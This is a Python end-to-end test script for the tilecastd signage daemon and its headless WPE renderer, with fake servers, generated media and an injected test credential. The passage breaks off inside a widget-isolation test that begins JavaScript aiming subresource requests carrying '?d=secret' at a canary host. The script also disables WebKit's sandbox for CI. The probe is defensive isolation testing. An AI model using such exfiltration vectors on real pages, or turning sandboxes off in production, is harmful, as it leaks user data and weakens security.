#!/usr/bin/env python3
"""Headless end-to-end test: tilecastd + tilecast-renderer-wpe (WPEPlatform).

Starts a real daemon and a real renderer on WPE_PLATFORM=headless, then
observes the renderer lifecycle only through `tilecastctl --json status`,
exactly as an operator would. Scenarios:

  status   the status surface activates and produces meaningful evidence
  fixture  a CAS-backed playlist (image, H.264 video, render tree, layout)
           activates, and the renderer reports item evidence for each kind
  reconnect  killing the renderer does not disturb the daemon; a new
             renderer receives the same activation (generation unchanged)
  selftest   `tilecastd self-test` (the migration's release self-test) passes
             only after the renderer proves every fixture item, and fails
             with a typed reason when no renderer connects
  website    remote web through the isolated tilecast-web-renderer-wpe: a
             fullscreen Website, a Layout with two remote zones, website
             evidence, and a helper crash that fails only the web surfaces
             while other content plays on, then recovers (needs root and
             --web-helper)
  stream     authenticated large-video streaming: a video oversized for
             the 1 MiB test cache plays through origin range reads (never
             downloaded whole) with video progress evidence, and the
             heartbeat reports the stream-backed video
  airplay    single-screen AirPlay Present (docs/tilecast-edge-airplay.md):
             a real tilecastd in tilecast-edge.service, the real
             tilecast-airplay supervisor under its socket unit with the fake
             UxPlay, the renderer with WebKit's sandbox on, synthetic RTP to
             127.0.0.1:42000/42002, the Runtime decoding the stream, capture
             excluded, and signage back after the stop. Needs systemd as
             PID 1: run it from apps/edge/ci/run-airplay-e2e.sh

Usage: e2e_headless.py --bin-dir DIR --renderer PATH --runtime-dir DIR
                       [--web-helper PATH]
                       [--scenario status|fixture|reconnect|selftest|website|stream|all]
"""
import argparse
import hashlib
import http.server
import json
import os
import shutil
import signal
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import uuid


def wait_for(description, predicate, timeout=60.0, interval=0.25):
    deadline = time.monotonic() + timeout
    last = None
    while time.monotonic() < deadline:
        try:
            last = predicate()
            if last:
                return last
        except Exception as error:  # noqa: BLE001 - reported below
            last = error
        time.sleep(interval)
    raise AssertionError(f"timed out waiting for {description}; last={last!r}")


class Stack:
    def __init__(self, args, workdir, fixture=None):
        self.args = args
        self.workdir = workdir
        self.socket = os.path.join(workdir, "run", "edge.sock")
        self.config = os.path.join(workdir, "edge.toml")
        lines = [
            "[paths]",
            f'state_dir = "{workdir}/state"',
            f'runtime_dir = "{workdir}/run"',
            "[renderer]",
            f'binary = "{args.renderer}"',
            "stall_threshold_seconds = 60",
            "[log]",
            'level = "info"',
            'format = "text"',
            # Empty hardware roots: the test never reaches a real display.
            "[dev]",
            f'hardware_dev_dir = "{workdir}/hardware/dev"',
            f'hardware_sys_dir = "{workdir}/hardware/sys"',
            f'networkd_socket = "{workdir}/hardware/networkd.sock"',
            # The headless scenarios exercise AirPlay itself, so they open the
            # qualification gate (docs/tilecast-edge-airplay.md section 12).
            "airplay_qualified = true",
            "idle_inhibit = false",
        ]
        if fixture:
            lines += [f'fixture = "{fixture}"']
        with open(self.config, "w", encoding="utf-8") as handle:
            handle.write("\n".join(lines) + "\n")
        self.daemon = None
        self.renderer = None
        self.logs = []

    def start_daemon(self):
        log = open(os.path.join(self.workdir, "tilecastd.log"), "w", encoding="utf-8")
        self.logs.append(log.name)
        self.daemon = subprocess.Popen(
            [os.path.join(self.args.bin_dir, "tilecastd"), "--config", self.config, "run"],
            stdout=log,
            stderr=subprocess.STDOUT,
        )
        wait_for("daemon socket", lambda: os.path.exists(self.socket), timeout=30)

    def start_renderer(self, run_dir=None):
        run_dir = run_dir or os.path.join(self.workdir, "run")
        log = open(os.path.join(self.workdir, "renderer.log"), "a", encoding="utf-8")
        self.logs.append(log.name)
        env = dict(os.environ)
        # Containers without unprivileged user namespaces cannot run WebKit's
        # bubblewrap sandbox. CI only; production keeps the sandbox.
        env.setdefault("WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS", "1")
        self.renderer = subprocess.Popen(
            [
                self.args.renderer,
                "--platform=headless",
                f"--socket={os.path.join(run_dir, 'edge.sock')}",
                f"--media-socket={os.path.join(run_dir, 'media.sock')}",
                f"--runtime-dir={self.args.runtime_dir}",
                f"--gst-plugin-dir={self.args.gst_plugin_dir}",
                "--headless-size=1280x720",
                "--console",
                f"--web-control-socket={os.path.join(self.workdir, 'web', 'control.sock')}",
                f"--web-frames-dir={os.path.join(self.workdir, 'web', 'frames')}",
            ],
            stdout=log,
            stderr=subprocess.STDOUT,
            env=env,
        )

    def start_web_helper(self):
        """The isolated helper as an unprivileged account (it refuses root)."""
        web = os.path.join(self.workdir, "web")
        for sub in ("", "frames", "data", "cache", "home"):
            os.makedirs(os.path.join(web, sub), exist_ok=True)
            os.chown(os.path.join(web, sub), WEB_UID, WEB_UID)
        os.chmod(web, 0o755)
        log = open(os.path.join(self.workdir, "web-helper.log"), "a", encoding="utf-8")
        self.logs.append(log.name)
        env = dict(os.environ, HOME=os.path.join(web, "home"))
        env.setdefault("WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS", "1")
        self.web_helper = subprocess.Popen(
            ["setpriv", f"--reuid={WEB_UID}", f"--regid={WEB_UID}", "--clear-groups", self.args.web_helper,
             f"--control-socket={web}/control.sock", f"--frames-dir={web}/frames", f"--data-dir={web}/data",
             f"--cache-dir={web}/cache", f"--client-uid={os.getuid()}"],
            stdout=log, stderr=subprocess.STDOUT, env=env)
        wait_for("web helper socket", lambda: os.path.exists(os.path.join(web, "control.sock")), timeout=30)

    def ctl(self, *command):
        output = subprocess.run(
            [os.path.join(self.args.bin_dir, "tilecastctl"), "--socket", self.socket, "--json", *command],
            check=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
        return json.loads(output.stdout)

    def status(self):
        return self.ctl("status")

    def stop(self):
        for process in (self.renderer, getattr(self, "web_helper", None), self.daemon):
            if process and process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=15)
                except subprocess.TimeoutExpired:
                    process.kill()

    def dump_logs(self):
        for name in dict.fromkeys(self.logs):
            print(f"----- {name} -----")
            with open(name, encoding="utf-8", errors="replace") as handle:
                print(handle.read()[-6000:])


def healthy(stack):
    status = stack.status()
    renderer = status["renderer"]
    return status if renderer["state"] == "healthy" else None


def scenario_status(args):
    with tempfile.TemporaryDirectory() as workdir:
        stack = Stack(args, workdir)
        try:
            stack.start_daemon()
            stack.start_renderer()
            status = wait_for("healthy renderer on the status surface", lambda: healthy(stack))
            renderer = status["renderer"]
            assert renderer["platform"] == "headless", renderer
            assert renderer["kind"] == "wpe", renderer
            print(f"status: renderer healthy, generation {renderer['currentActivationGeneration']}")
            # Clean shutdown of the daemon leaves the renderer waiting to reconnect.
            stack.daemon.terminate()
            assert stack.daemon.wait(timeout=20) == 0, "tilecastd exits 0 on SIGTERM"
            time.sleep(1)
            assert stack.renderer.poll() is None, "renderer survives a daemon stop"
            stack.start_daemon()
            wait_for("renderer reconnects after daemon restart", lambda: healthy(stack))
            print("status: renderer reconnected after daemon restart")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            stack.stop()


def scenario_reconnect(args):
    with tempfile.TemporaryDirectory() as workdir:
        stack = Stack(args, workdir)
        try:
            stack.start_daemon()
            stack.start_renderer()
            before = wait_for("healthy renderer", lambda: healthy(stack))["renderer"]
            stack.renderer.kill()
            stack.renderer.wait(timeout=10)
            wait_for("daemon notices the renderer is gone", lambda: not stack.status()["renderer"]["connected"])
            assert stack.daemon.poll() is None, "daemon unaffected by a renderer crash"
            stack.start_renderer()
            after = wait_for("healthy renderer after restart", lambda: healthy(stack))["renderer"]
            assert after["currentActivationGeneration"] == before["currentActivationGeneration"], (before, after)
            print("reconnect: same activation restored after renderer crash")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            stack.stop()


def build_fixture(workdir):
    """Copies the playlist fixture and generates its media with ffmpeg."""
    source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures", "playlist.json")
    fixture_dir = os.path.join(workdir, "fixture")
    media = os.path.join(fixture_dir, "media")
    os.makedirs(media)
    with open(source, encoding="utf-8") as handle, open(
        os.path.join(fixture_dir, "playlist.json"), "w", encoding="utf-8"
    ) as out:
        out.write(handle.read())
    run = lambda *argv: subprocess.run(["ffmpeg", "-loglevel", "error", "-y", *argv], check=True)  # noqa: E731
    run("-f", "lavfi", "-i", "testsrc=size=1280x720:rate=1", "-frames:v", "1", os.path.join(media, "still.png"))
    run(
        "-f", "lavfi", "-i", "testsrc=size=1280x720:rate=30", "-t", "4",
        "-c:v", "libx264", "-profile:v", "baseline", "-pix_fmt", "yuv420p", "-movflags", "+faststart",
        os.path.join(media, "clip.mp4"),
    )
    return os.path.join(fixture_dir, "playlist.json")


def scenario_fixture(args):
    with tempfile.TemporaryDirectory() as workdir:
        fixture = build_fixture(workdir)
        stack = Stack(args, workdir, fixture=fixture)
        try:
            stack.start_daemon()
            stack.start_renderer()
            status = wait_for("fixture activation", lambda: healthy(stack), timeout=90)
            # The renderer can be healthy on the setup surface before the
            # fixture task has imported and pinned both media files.
            wait_for(
                "the fixture's media verified and pinned",
                lambda: (lambda c: c if c["objectCount"] >= 2 and c["pinnedBytes"] > 0 else None)(stack.ctl("cache")),
                timeout=60,
            )
            evidence = wait_for(
                "item evidence and real Layout playlist-zone H.264 progress",
                lambda: fixture_evidence(stack),
                timeout=120,
                interval=1.0,
            )
            presentation = wait_for(
                "the fixture accepted with evidence in status",
                lambda: (lambda p: p if p and p["accepted"] and p["evidence"] else None)(
                    stack.status().get("presentation")
                ),
            )
            assert presentation["source"] == "fixture", presentation
            status = stack.status()
            assert presentation["generation"] == status["renderer"]["currentActivationGeneration"], presentation
            assert status["renderer"].get("engineVersion") and status["renderer"].get("gstreamerVersion"), status
            print(f"fixture: generation {status['renderer']['currentActivationGeneration']}, evidence {sorted(evidence)}")
            print("fixture: zone-video H.264 readiness and video_progress confirmed inside item-layout-video")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            stack.stop()


def run_self_test(args, workdir, fixture, timeout, with_renderer):
    stack = Stack(args, workdir)
    run_dir = os.path.join(workdir, "selftest")
    os.makedirs(run_dir, mode=0o750)
    log = open(os.path.join(workdir, "selftest.log"), "w", encoding="utf-8")
    stack.logs.append(log.name)
    host = subprocess.Popen(
        [os.path.join(args.bin_dir, "tilecastd"), "--config", stack.config, "self-test",
         f"--fixture={fixture}", f"--runtime-dir={run_dir}", f"--timeout-seconds={timeout}"],
        stdout=subprocess.PIPE, stderr=log, text=True,
    )
    try:
        if with_renderer:
            wait_for("self-test socket", lambda: os.path.exists(os.path.join(run_dir, "edge.sock")), timeout=30)
            stack.start_renderer(run_dir)
        output, _ = host.communicate(timeout=timeout + 30)
        report = json.loads(output.strip().splitlines()[-1])
        return host.returncode, report, stack
    except Exception:
        host.kill()
        stack.dump_logs()
        raise
    finally:
        stack.stop()


def scenario_selftest(args):
    with tempfile.TemporaryDirectory() as workdir:
        fixture = build_fixture(workdir)
        code, report, stack = run_self_test(args, workdir, fixture, 120, with_renderer=True)
        if code != 0 or report["outcome"] != "passed":
            stack.dump_logs()
            raise AssertionError(f"self-test failed: {report}")
        assert report["expectedItems"] == report["provenItems"] and len(report["expectedItems"]) == 5, report
        renderer = report["renderer"]
        assert renderer["platform"] == "headless" and "video" in renderer["features"], renderer
        assert renderer["engineVersion"] and renderer["gstreamerVersion"], renderer
        assert not os.path.exists(os.path.join(workdir, "state")), "the self-test never touches installation state"
        print(f"selftest: passed in {report['elapsedMs']} ms, items {report['provenItems']}, "
              f"WPE {renderer['engineVersion']}, GStreamer {renderer['gstreamerVersion']}")
    with tempfile.TemporaryDirectory() as workdir:
        fixture = build_fixture(workdir)
        code, report, _ = run_self_test(args, workdir, fixture, 10, with_renderer=False)
        assert code == 1 and report["outcome"] == "failed" and report["reason"] == "renderer_not_ready", report
        print("selftest: without a renderer it fails with renderer_not_ready")


WEB_UID = 4242
WEB_PAGES = {
    "/page.html": b"<!doctype html><body style='margin:0;background:#1a4'><h1 id=n>0</h1>"
                  b"<script>let n=0;setInterval(()=>{document.getElementById('n').textContent=++n},200)</script>",
    "/zone.html": b"<!doctype html><body style='margin:0;background:#a41'><h1>zone</h1></body>",
}


class WebHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):  # noqa: N802
        body = WEB_PAGES.get(self.path)
        self.send_response(200 if body else 404)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body or b"")))
        self.end_headers()
        self.wfile.write(body or b"")


def page_content(path):
    return {"kind": "page", "url": f"http://127.0.0.1{path}", "allowedHosts": ["127.0.0.1"],
            "javascriptEnabled": True, "domStorageEnabled": True, "cookiePolicy": "disabled", "userAgent": "",
            "zoomPercent": 100, "scrollX": 0, "scrollY": 0, "backgroundColor": "#000000"}


def remote_spec(path):
    return {"content": page_content(path), "presentation": {
        "loadTimeoutSeconds": 20, "reloadIntervalSeconds": None, "lifecycle": "destroy_on_hide",
        "warmSeconds": 0, "onlineOnly": False, "failureBehavior": "placeholder", "fallbackSrc": None,
        "playUntilEnd": False}}


def build_website_fixture(workdir):
    fixture_dir = os.path.join(workdir, "fixture")
    os.makedirs(os.path.join(fixture_dir, "media"))
    subprocess.run(["ffmpeg", "-loglevel", "error", "-y", "-f", "lavfi", "-i", "testsrc=size=1280x720:rate=1",
                    "-frames:v", "1", os.path.join(fixture_dir, "media", "still.png")], check=True)
    item = lambda **kw: {"src": "", "durationMs": 6000, "fitMode": "contain", "audioEnabled": False,  # noqa: E731
                         "volume": 1.0, "videoStartOffsetMs": None, "videoEndOffsetMs": None, **kw}
    zone = lambda zone_id, x, width, **kw: {"id": zone_id, "x": x, "y": 0, "width": width, "height": 1080,  # noqa: E731
                                            "layer": 0, "opacity": 1, **kw}
    presentation = {
        "state": "playing", "takeover": False, "generation": 1, "synchronized": False,
        "requires": ["remote-web-v1", "website"],
        "items": [
            item(id="item-website", kind="website", src="http://127.0.0.1/page.html",
                 website={"loadTimeoutSeconds": 20, "refreshIntervalSeconds": None, "zoomPercent": 100,
                          "javascriptEnabled": True, "domStorageEnabled": True, "cookiePolicy": "first_party",
                          "reloadPolicy": "on_each_activation", "customUserAgent": "", "scrollX": 0, "scrollY": 0,
                          "backgroundColor": "#000000", "failureBehavior": "placeholder", "fallbackSrc": None,
                          "allowedHosts": ["127.0.0.1"]}),
            item(id="item-layout", kind="layout", layout={
                "canvasWidth": 1920, "canvasHeight": 1080, "background": "#000000",
                "zones": [zone("zone-a", 0, 800, remoteWeb=remote_spec("/page.html")),
                          zone("zone-b", 800, 640, remoteWeb=remote_spec("/zone.html")),
                          zone("zone-c", 1440, 480, render={"t": "text", "value": "native"})]}),
            item(id="item-image", kind="image", src="media:still"),
        ],
    }
    path = os.path.join(fixture_dir, "playlist.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump({"media": [{"id": "still", "file": "media/still.png", "mimeType": "image/png"}],
                   "presentation": presentation}, handle)
    return path


def accepted_evidence(stack, since=0):
    """(kind, item, zone) of every meaningful evidence the daemon accepted."""
    seen = []
    with open(os.path.join(stack.workdir, "tilecastd.log"), encoding="utf-8", errors="replace") as handle:
        for index, line in enumerate(handle):
            if index < since or "evidence_accepted" not in line:
                continue
            fields = dict(part.split("=", 1) for part in line.split() if "=" in part)
            seen.append((fields.get("kind", "").strip('"'), fields.get("item", "").strip('"'),
                         fields.get("zone", "").strip('"')))
    return seen


def log_lines(stack):
    with open(os.path.join(stack.workdir, "tilecastd.log"), encoding="utf-8", errors="replace") as handle:
        return sum(1 for _ in handle)


def scenario_website(args):
    if not args.web_helper:
        raise ValueError("website scenario requires --web-helper")
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 80), WebHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    with tempfile.TemporaryDirectory(dir="/tmp", prefix="tcw") as workdir:
        os.chmod(workdir, 0o755)
        fixture = build_website_fixture(workdir)
        stack = Stack(args, workdir, fixture=fixture)
        try:
            stack.start_daemon()
            stack.start_web_helper()
            stack.start_renderer()
            wait_for("remote web advertised", lambda: [c for c in stack.ctl("capabilities")["capabilities"]
                     if c["id"] == "renderer.remote_web" and c["state"] in ("available", "degraded")], timeout=90)
            wait_for("a fullscreen Website loaded", lambda: [e for e in accepted_evidence(stack)
                     if e[0] == "website_loaded" and e[1] == "item-website"], timeout=90, interval=1)
            zones = wait_for("both remote Layout zones rendered", lambda: (lambda z: z if {"zone-a", "zone-b"} <= z
                             else None)({e[2] for e in accepted_evidence(stack) if e[0] == "layout_zone_rendered"}),
                             timeout=90, interval=1)
            print(f"website: fullscreen page and Layout zones {sorted(zones)} rendered through the helper")
            capabilities = stack.ctl("capabilities")
            remote = [c for c in capabilities["capabilities"] if c["id"] == "renderer.remote_web"]
            assert remote and remote[0]["state"] in ("available", "degraded"), remote
            print(f"website: renderer.remote_web is {remote[0]['state']} ({remote[0].get('reasonCode')})")

            # The helper ends: web surfaces fail over, other content plays on,
            # and the trusted renderer is never restarted or reloaded.
            #
            # Synchronize the crash to the Layout item. Waiting for both remote
            # zones can span more than one playlist cycle on a loaded runner;
            # without this phase barrier the helper can be killed during the
            # fullscreen Website, whose failure retry can legitimately keep the
            # playlist there long enough to make the image assertion flaky.
            #
            # Use the live status surface rather than evidence_accepted logs:
            # those logs intentionally record most (item, kind) pairs only once
            # per activation, while currentItemId changes on every item start.
            wait_for(
                "the Layout item before the helper crash",
                lambda: stack.status()["renderer"].get("currentItemId") == "item-layout",
                timeout=30,
                interval=0.25,
            )
            renderer_pid = stack.renderer.pid
            mark = log_lines(stack)
            stack.web_helper.send_signal(signal.SIGKILL)
            stack.web_helper.wait(timeout=10)
            wait_for("an image shown while the helper is down", lambda: [e for e in accepted_evidence(stack, mark)
                     if e[0] == "image_shown"], timeout=60, interval=1)
            assert stack.renderer.poll() is None and stack.renderer.pid == renderer_pid, "renderer untouched"
            with open(os.path.join(workdir, "renderer.log"), encoding="utf-8", errors="replace") as handle:
                assert "web process terminated" not in handle.read(), "the trusted runtime never reloaded"
            stack.start_web_helper()
            mark = log_lines(stack)
            wait_for("a Website loads again after the helper restarted", lambda: [e for e in accepted_evidence(
                stack, mark) if e[0] == "website_loaded"], timeout=120, interval=1)
            print("website: helper crash failed only the web surfaces; the next Website recovered")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            stack.stop()
            server.shutdown()


# ---------------------------------------------------------------- stream
#
# A real WPE/GStreamer smoke test for authenticated large-video streaming:
# the daemon pairs against a fake Tilecast Server (credential + binding
# injected, exactly as pairing would persist them), receives a manifest
# whose only video is oversized for its 1 MiB cache, and the headless
# renderer plays it through authenticated origin range reads. Nothing is
# ever downloaded whole.

STREAM_CREDENTIAL = "tc_device_" + "s" * 26 + "." + "t" * 40


class StreamState:
    def __init__(self, installation, screen, video, digest_hex):
        self.installation = installation
        self.screen = screen
        self.video = video
        self.digest_hex = digest_hex
        self.asset_id = str(uuid.uuid4())
        self.variant_id = str(uuid.uuid4())
        self.item_id = str(uuid.uuid4())
        self.path = f"/api/v1/player/assets/{self.asset_id}/variants/{self.variant_id}"
        self.manifest_etag = '"manifest-1"'
        self.lock = threading.Lock()
        self.heartbeats = []
        self.range_requests = 0
        self.full_requests = 0

    def manifest(self):
        return {
            "schemaVersion": 11, "manifestVersion": 1, "screenId": self.screen,
            "generatedAt": "2026-10-08T00:00:00Z", "mode": "presentation",
            "assets": [{
                "assetId": self.asset_id, "variantId": self.variant_id,
                "mimeType": "video/mp4", "sha256": self.digest_hex,
                "fileSize": len(self.video), "downloadPath": self.path,
            }],
            "playlist": {"id": str(uuid.uuid4()), "revision": 1, "name": "Stream",
                         "items": [{
                             "id": self.item_id, "assetId": self.asset_id,
                             "variantId": self.variant_id, "assetType": "video",
                             "durationMs": 15000, "fitMode": "contain", "transition": "none",
                             "audioEnabled": False, "volume": 0.5, "deliveryPolicy": "automatic",
                         }]},
            "playlists": [], "schedules": [], "websites": [], "widgets": [],
            "dataSources": [], "plugins": [], "layouts": [],
            "prefetchHorizonDays": 14, "activationGraceSeconds": 3600,
        }


class StreamHandler(http.server.BaseHTTPRequestHandler):
    server_version = "TilecastStreamFake/1"

    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.stream_state

    def _send_json(self, code, obj, headers=()):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        for key, value in headers:
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length) if length else b"{}"
        return json.loads(raw or b"{}")

    def _authorized(self):
        return self.headers.get("Authorization") == f"Bearer {STREAM_CREDENTIAL}"

    def _deny(self):
        self._send_json(401, {"error": {"code": "device_credential_invalid", "message": "rejected"}})

    def do_GET(self):  # noqa: N802
        if self.path == "/api/v1/system/identity":
            return self._send_json(200, {"data": {
                "product": "tilecast", "installationId": self.state.installation,
                "organizationName": "Stream Test", "apiVersion": "v1", "pairingEnabled": False,
            }})
        if not self._authorized():
            return self._deny()
        if self.path == "/api/v1/player/manifest":
            if self.headers.get("If-None-Match") == self.state.manifest_etag:
                self.send_response(304)
                self.end_headers()
                return
            return self._send_json(200, {"data": self.state.manifest()}, [("ETag", self.state.manifest_etag)])
        if self.path == "/api/v1/player/config":
            return self._send_json(200, {"data": {"schemaVersion": 1, "configRevision": 1}})
        if self.path == "/api/v1/player/commands":
            return self._send_json(200, {"data": {"items": []}})
        if self.path == self.state.path:
            return self._serve_video()
        return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})

    def _serve_video(self):
        total = len(self.state.video)
        asked = self.headers.get("Range")
        with self.state.lock:
            if not asked:
                self.state.full_requests += 1
        if not asked:
            self.send_response(200)
            self.send_header("Content-Type", "video/mp4")
            self.send_header("Content-Length", str(total))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            self.wfile.write(self.state.video)
            return
        try:
            unit, spec = asked.split("=", 1)
            start_s, end_s = spec.split("-", 1)
            start, end = int(start_s), int(end_s)
            assert unit == "bytes" and 0 <= start <= end < total
        except (ValueError, AssertionError):
            self.send_response(416)
            self.send_header("Content-Range", f"bytes */{total}")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        with self.state.lock:
            self.state.range_requests += 1
        chunk = self.state.video[start : end + 1]
        self.send_response(206)
        self.send_header("Content-Type", "video/mp4")
        self.send_header("Content-Length", str(len(chunk)))
        self.send_header("Content-Range", f"bytes {start}-{end}/{total}")
        self.send_header("ETag", f'"sha256-{self.state.digest_hex}"')
        self.end_headers()
        self.wfile.write(chunk)

    def do_POST(self):  # noqa: N802
        if not self._authorized():
            self._read_json()
            return self._deny()
        if self.path == "/api/v1/player/heartbeat":
            payload = self._read_json()
            with self.state.lock:
                self.state.heartbeats.append(payload)
            return self._send_json(200, {"data": {}})
        if self.path == "/api/v1/player/liveness":
            self._read_json()
            return self._send_json(200, {"data": {}})
        if self.path == "/api/v1/player/telemetry":
            self._read_json()
            return self._send_json(200, {"data": {"accepted": True}})
        if self.path == "/api/v1/player/activity-events":
            batch = self._read_json()
            events = batch.get("events", [])
            return self._send_json(200, {"data": {
                "accepted": len(events),
                "acknowledgedEventIds": [e.get("id") for e in events],
            }})
        self._read_json()
        return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})


def inject_pairing(workdir, server_url, installation, screen):
    """Persist the pairing result exactly as enrollment would: the device
    credential file plus the server binding row."""
    state_dir = os.path.join(workdir, "state")
    identity_dir = os.path.join(state_dir, "identity")
    os.makedirs(identity_dir, exist_ok=True)
    credential_path = os.path.join(identity_dir, "device-credential")
    with open(credential_path, "w", encoding="utf-8") as handle:
        handle.write(STREAM_CREDENTIAL)
    os.chmod(credential_path, 0o600)
    now_ms = int(time.time() * 1000)
    db = sqlite3.connect(os.path.join(state_dir, "state.db"))
    db.execute(
        """INSERT INTO server_binding (id, server_url, installation_id, organization_name,
           screen_id, screen_name, credential_state, identity_verified_at_ms, bound_at_ms,
           updated_at_ms) VALUES (1, ?, ?, ?, ?, ?, ?, ?, ?, ?)
           ON CONFLICT (id) DO UPDATE SET server_url = excluded.server_url,
           installation_id = excluded.installation_id, screen_id = excluded.screen_id,
           credential_state = excluded.credential_state,
           identity_verified_at_ms = excluded.identity_verified_at_ms,
           updated_at_ms = excluded.updated_at_ms""",
        [server_url, installation, "Stream Test", screen, "Stream Screen",
         "stored", now_ms, now_ms, now_ms],
    )
    db.commit()
    db.close()


def build_stream_video(workdir):
    """A real multi-megabyte H.264 MP4 with its index up front, so range
    reads play it without ever needing the tail first."""
    path = os.path.join(workdir, "stream.mp4")
    subprocess.run(
        ["ffmpeg", "-loglevel", "error", "-y", "-f", "lavfi",
         "-i", "testsrc=size=1280x720:rate=30", "-t", "15",
         "-c:v", "libx264", "-profile:v", "baseline", "-pix_fmt", "yuv420p",
         # A pinned bitrate keeps the fixture well above the 1 MiB test
         # cache however well the synthetic source compresses.
         "-b:v", "1500k", "-movflags", "+faststart", path],
        check=True,
    )
    with open(path, "rb") as handle:
        video = handle.read()
    assert len(video) > 1024 * 1024, f"the stream fixture must exceed the 1 MiB test cache, got {len(video)}"
    return video, hashlib.sha256(video).hexdigest()


def stream_evidence(stack):
    seen = set()
    with open(os.path.join(stack.workdir, "tilecastd.log"), encoding="utf-8", errors="replace") as handle:
        for line in handle:
            if "evidence_accepted" in line and "video_progress" in line:
                seen.add("video_progress")
    return seen if seen else None


def scenario_stream(args):
    with tempfile.TemporaryDirectory() as workdir:
        video, digest_hex = build_stream_video(workdir)
        installation = str(uuid.uuid4())
        screen = str(uuid.uuid4())
        state = StreamState(installation, screen, video, digest_hex)
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), StreamHandler)
        server.stream_state = state
        server_url = f"http://127.0.0.1:{server.server_address[1]}"
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        stack = Stack(args, workdir)
        # A 1 MiB cache: the multi-megabyte video is oversized for it and
        # must stream instead of downloading.
        with open(stack.config, "a", encoding="utf-8") as handle:
            handle.write("[cas]\nlimit_bytes = 1048576\nreserved_free_bytes = 0\n")
        try:
            # First boot creates the state database; pairing is then
            # injected and the daemon restarts as a paired player.
            stack.start_daemon()
            stack.stop()
            inject_pairing(workdir, server_url, installation, screen)
            stack.start_daemon()
            stack.start_renderer()
            wait_for("the stream activation", lambda: healthy(stack), timeout=90)
            wait_for("video progress evidence through range reads", lambda: stream_evidence(stack), timeout=180)
            presentation = wait_for(
                "the stream accepted with evidence in status",
                lambda: (lambda p: p if p and p["accepted"] and p["evidence"] else None)(
                    stack.status().get("presentation")
                ),
            )
            assert presentation["source"] == "server_manifest", presentation
            with state.lock:
                assert state.range_requests > 0, "the renderer played without a single range read"
                assert state.full_requests == 0, "the video was downloaded whole instead of streamed"
                beats = [b for b in state.heartbeats if b.get("streamBackedAssetCount") == 1]
                assert beats, "no heartbeat reported the stream-backed video"
                assert beats[0].get("nativePresentationCapabilities", {}).get("media-streaming") == 1, beats[0]
            cache = stack.ctl("cache")
            assert cache["objectCount"] == 0, f"streaming cached objects: {cache}"
            print(f"stream: {state.range_requests} range reads, video_progress evidence, cache empty")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            server.shutdown()
            thread.join(timeout=10)
            stack.stop()


def fixture_evidence(stack):
    # The daemon logs each meaningful evidence kind it accepts once per item.
    seen = set()
    with open(os.path.join(stack.workdir, "tilecastd.log"), encoding="utf-8", errors="replace") as handle:
        for line in handle:
            if "evidence_accepted" in line:
                for kind in ("image_shown", "video_progress", "widget_shown", "layout_shown", "item_transition"):
                    if kind in line:
                        seen.add(kind)
    required = {"image_shown", "video_progress", "widget_shown", "layout_shown", "item_transition"}
    nested = set(accepted_evidence(stack))
    # Canvas and selection evidence cannot prove that GStreamer decoded the
    # nested H.264. Require progress from this Layout's specific video zone.
    child_ready = ("layout_zone_rendered", "item-layout-video", "zone-video")
    child_progress = ("video_progress", "item-layout-video", "zone-video")
    # Reach the next Layout too: the four-second clip must not stall the
    # Runtime during its fifteen-second native-looping occurrence.
    next_layout = ("layout_zone_rendered", "item-layout", "zone-image")
    return seen if required <= seen and {child_ready, child_progress, next_layout} <= nested else None


# ---------------------------------------------------------------- widget
#
# External Widgets through the real WPE path: the daemon pairs against a
# fake Tilecast Server, fetches verified sandbox frame documents built by
# the SDK's own frame builder over the conformance fixture bundles, and
# the headless renderer executes them in confined iframes. The fixture
# bundle gates its ready signal on every host input (compiled config,
# prepared documents, a granted media URI whose bytes load, a sane
# clock), so each widget_shown proves the full input chain. The hostile
# bundle probes isolation and phones a canary that must never ring.

WIDGET_PACKAGE = "acme.athletics"
WIDGET_ID = "scoreboard"
EVIL_PACKAGE = "acme.evil"
EVIL_ID = "probe"


def build_frame_document(bundle_name, extra=""):
    """The exact frame document production would serve for a fixture.

    `extra` is appended to the bundle, for WPE-only probes that must not
    change the shared fixture other hosts run."""
    tests_dir = os.path.dirname(os.path.abspath(__file__))
    root = os.path.normpath(os.path.join(tests_dir, "..", "..", "..", ".."))
    bundle = os.path.join(root, "packages", "player-contracts", "fixtures", "widget-package", bundle_name)
    helper = os.path.join(tests_dir, "build_frame_doc.py")
    with open(bundle, encoding="utf-8") as handle:
        source = handle.read() + extra
    completed = subprocess.run([sys.executable, helper], input=source, check=True,
                               capture_output=True, text=True)
    return completed.stdout.encode("utf-8")


# Passive exfiltration on the real engine (the Browser Player proves the
# same vectors on Chromium in apps/player-web/e2e/frames). connect-src
# alone does not cover these: each subresource kind aims at the reachable
# canary, outside the loopback /media/ route, so only the served frame
# policy stands between the Widget and the canary's hit counter.
PASSIVE_VECTORS = """
(function (canary) {
  "use strict";
  function aim(name, attempt) {
    try { attempt(canary + "/" + name + "?d=secret"); } catch (err) {}
  }
